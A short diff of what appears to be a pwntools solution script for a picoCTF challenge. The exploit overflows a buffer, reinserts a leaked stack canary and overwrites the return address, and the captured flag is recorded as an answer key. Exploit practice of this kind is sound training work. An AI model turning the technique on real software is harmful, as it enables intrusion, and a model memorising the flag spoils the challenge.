@@ -494,9 +494,11 @@ def get_canary():
 canary = get_canary()
 print(canary)
 
-io = process("./vuln")
+#io = process("./vuln")
+io = remote("saturn.picoctf.net", 54767)
 io.sendlineafter(b"> ", b"100")
 io.sendlineafter(b"> ", b'A'*64 + canary + b'B'*16 + p32(0x8049336))
 print(io.read())
-
+print(io.read())
+# picoCTF{Stat1C_c4n4r13s_4R3_b4D_0bf0b08e}
 ```
